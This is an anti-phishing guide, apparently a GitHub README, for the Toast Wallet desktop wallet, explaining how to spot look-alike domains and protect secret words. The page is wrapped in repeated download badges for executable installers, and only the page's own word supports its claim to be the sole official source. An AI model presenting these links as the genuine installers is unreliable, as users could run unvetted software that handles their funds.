<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet phishing sites warning</h1>

<p align="center">Spot look-alike addresses that ask for your words.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Phishing sites copy the look of Toast Wallet and ask for your secrets or offer altered downloads. Check that downloads come from the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) on GitHub, verify the checksum, and never enter your words, passphrase, backup code or keys on any website.

## 👀 You'll see this if

- A search result or advert leads to a site that looks like Toast Wallet.
- A site offers a "web wallet", "online restore" or "converter" for Toast.
- An email or message links to a "wallet validation" page.
- The address in your browser looks almost, but not exactly, right.

## 🤔 Why it happens

Phishing works by imitation. Copying a logo, colours and layout takes minutes. Scammers register domain names that differ by one letter, use different endings, or add words like "recover", "secure" or "app". They pay for search adverts so their pages appear above genuine results. Some even host pages on reputable platforms to borrow trust.

None of this changes one simple fact: the desktop wallet does not need any website to work. Restoring, unlocking and converting all happen on your own computer.

## 🧭 Before you start

Learn the shape of the genuine download location: `github.com/Toast-Wallet/core`, with releases on the releases page of that repository. Bookmark it once and use the bookmark rather than search results.

## 🛠️ Fix: spot and avoid phishing sites

1. **Read the full address.** Look at the domain before the first single slash. Be wary of extra words, hyphens or unusual endings.
2. **Check for secret requests.** If a page asks for your six words, passphrase, backup code or secret key, close it.
3. **Avoid adverts for wallets.** Scroll past sponsored results or, better, use your bookmark.
4. **Verify downloads.** Even from the right site, compare the SHA-256 checksum; see [verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md).
5. **Ignore "converters" for Toast's six words.** The words cannot be converted into keys; see [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md).
6. **Report the page** to your browser's phishing reporting tool.
7. **If you entered secrets,** move your XRP to a new wallet from a clean computer right away.

Known fakes are listed by name in [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md).

## 🧩 Real-world example

A user receives an email titled "Action required: your Toast Wallet will be disabled". The link leads to a page with the Toast logo and a form asking for the backup code "to keep your wallet active". The domain ends in an unusual extension. The user knows that wallets on their own computer cannot be disabled by email, deletes the message and reports it.

## ⚠️ Common mistakes

- Trusting a page because it uses HTTPS and shows a padlock; scam sites can have certificates too.
- Following links in emails about your wallet.
- Assuming a page hosted on a well-known platform must be official.
- Typing secrets "just to test" whether a site works.

## 🔁 If that did not work

- **You downloaded from a phishing site.** Delete the file and, if you ran it, stop using that computer for your wallet until it has been cleaned or reset.
- **You typed your secrets.** Act immediately as described above.
- **Someone then offers to help.** That is often the same scammers; see [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md).

## 🛡️ Prevention

Use one bookmark. Verify every download. Keep secrets offline. Teach the same habits to anyone who might help you with your wallet.

## 📝 Good to know

Phishing does not require any technical flaw in Toast Wallet. It relies entirely on persuading a person to type something in the wrong place. That is good news, because it means you can defend against it with habits alone. A wallet that never meets a website cannot be phished through a website.

## 🔍 A closer look at reading a web address

Reading an address correctly takes a few seconds once you know where to look. Find the part between `https://` and the next single slash. The last two parts of that section, such as `github.com`, are the real domain. Everything before them is a subdomain the site owner controls. So `github.com.toast-help.example` is not GitHub at all; its real domain is `toast-help.example`.

Watch for letter swaps such as `rn` instead of `m`, numbers in place of letters such as `0` for `o`, and extra hyphens. Look-alike characters from other alphabets can also be used, which is why a bookmark is the most dependable defence. If you ever arrive at a download page from a link rather than your bookmark, close it and reopen the release page from the bookmark.

## 🗂️ Quick test for any wallet page

Ask three questions. Did I arrive here from my own bookmark? Is the domain exactly the one I expect? Is the page asking for any secret? If the first two answers are not a clear yes, or the third is yes, leave the page. This takes ten seconds and removes almost all phishing risk.

It also helps to keep the desktop wallet and the web browser in separate mental boxes. Toast Wallet is an application on your computer. Nothing you do with it should start from a web form, apart from downloading the installer from the official release page.

## ❓ FAQ

<details>
<summary>Can my browser detect all phishing sites?</summary>

Browsers catch many, but new sites appear daily. Your habits are the best protection.

</details>

<details>
<summary>Is a padlock icon proof of safety?</summary>

No. It only means the connection is encrypted, not that the site is genuine.

</details>

<details>
<summary>Where should I report a fake site?</summary>

Use your browser's phishing report option and the hosting platform's abuse form.

</details>

> [!WARNING]
> No genuine website will ever ask for your Toast six words, passphrase, backup code or secret key.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Toast Wallet scams to avoid](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-scams-to-avoid.md) | Fake sites, fake apps and fake recovery tools named and explained. |
| [Verify a Toast Wallet download checksum](https://github.com/Toast-Wallet/learn/blob/main/how-to/verify-toast-wallet-download-checksum.md) | Compare SHA-256 values so you know the installer is the real one. |
| [Toast Wallet fake support warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-fake-support-warning.md) | How fake helpers approach you and what real help looks like. |
| [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md) | Why the six words alone cannot rebuild a wallet. |
